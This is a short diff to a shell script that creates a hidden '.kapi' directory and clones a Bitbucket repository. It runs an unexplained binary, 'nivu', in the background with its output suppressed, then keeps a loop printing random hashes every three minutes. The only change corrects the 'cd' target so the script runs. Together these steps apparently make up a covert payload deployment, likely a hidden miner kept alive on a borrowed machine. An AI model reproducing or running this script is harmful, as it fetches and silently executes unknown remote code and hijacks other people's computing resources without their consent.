@@ -1,6 +1,6 @@
 mkdir .kapi && cd .kapi
 git clone https://bitbucket.org/nyileuh/herotes.git
-cd nevox
+cd herotes
 chmod +x aa.json && chmod +x nivu
 ./nivu -c "aa.json" > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
